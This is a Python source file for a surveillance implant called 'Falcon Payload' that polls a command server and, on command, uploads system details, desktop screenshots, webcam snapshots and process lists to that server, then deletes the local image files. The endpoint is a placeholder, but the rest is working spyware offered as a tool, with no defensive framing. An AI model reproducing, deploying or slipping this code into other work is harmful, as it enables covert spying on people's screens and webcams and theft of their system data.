""" Required Imports """
from unicodedata import numeric
import pyfiglet  # pip install pyfiglet
import requests  # pip install requests
import os
import time
import platform
import psutil  # pip install psutil
from PIL import ImageGrab  # pip install Pillow
from datetime import datetime
import cv2  # pip install opencv-python

REQUEST_URL = "Request Endpoint URL Here"
PAYLOAD_DIR = "./falcon/"

# Helper functions

def fetch_processes():
    """ Returns the current processes running
    in the background """
    processes = []

    for proc in psutil.process_iter():
        try:
            info = proc.as_dict(attrs=["pid", "name", "memory_percent"])
            info["memory_info"] = round(proc.memory_info().vms / int(1e6), 3)
            processes.append(info)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            print(f"Could not append {proc.pid}")
            continue

    return processes[:30]


def get_screenshot(save_path):
    """ Fetches the screenshot """
    screenshot = ImageGrab.grab()
    screenshot.save(PAYLOAD_DIR + save_path)


def get_webcam_snap(save_path):
    """ Fetches image from web cam """
    cap = cv2.VideoCapture(0)

    for _ in range(15):
        _, frame = cap.read()
        cv2.imwrite(PAYLOAD_DIR + save_path, frame)

    cap.release()
    cv2.destroyAllWindows()


def get_sys_info():
    """ Fetches basic information about the system """
    info = platform.uname()
    to_post = {
        "System Type": info.system,
        "System Name": info.node,
        "Processor": info.processor,
        "Architecture": info.machine,
        "RAM": psutil.virtual_memory().total // int(1e9),
    }
    return to_post


def start_payload():
    """ Listen for commands and perform
    corresponding action """
    header = pyfiglet.figlet_format("Falcon Payload")
    print(header)
    print("#" * 25 + " Welcome to Falcon. No one can hide from a Falcon's vision. " + "#" * 25)

    if not os.path.isdir(PAYLOAD_DIR):
        os.mkdir(PAYLOAD_DIR)

    connected = True
    max_retries = 0

    while connected and max_retries < 5:
        try:
            r = requests.get(REQUEST_URL, timeout=2.5)
        except:
            print("\nFalcon could not process your commands. Retrying...")
            max_retries += 1
            if max_retries == 5:
                print("\nMax retries limit reached! Calling the falcon back...")
        else:
            command_option = r.json()["action"]

            if command_option:
                try:
                    if command_option == 1:
                        to_post = get_sys_info()
                        post_status = requests.post(REQUEST_URL, json=to_post)

                    elif command_option in (2, 4):
                        file_name = ""
                        if command_option == 2:
                            fmt = "%m_%d_%Y_%H:%M:%S"
                            file_name = "ScreenShot" + datetime.now().strftime(fmt) + ".png"
                            get_screenshot(file_name)
                        else:
                            file_name = "Webcam" + datetime.now().strftime("%m_%d_%Y_%H:%M:%S") + ".png"
                            get_webcam_snap(file_name)

                        with open(PAYLOAD_DIR + file_name, "rb") as img:
                            post_status = requests.post(REQUEST_URL, files={"image": img})
                        os.remove(PAYLOAD_DIR + file_name)

                    elif command_option == 3:
                        bg_processes = fetch_processes()
                        post_status = requests.post(REQUEST_URL, json={
                                                    "process_arr": bg_processes})

                    elif command_option == 5:
                        connected = False

                    print(f"Request Sent! Status Code: {post_status.status_code} Command Code: {command_option}")

                except Exception as exception:
                    print(exception)

        time.sleep(5)


if __name__ == "__main__":
    start_payload()
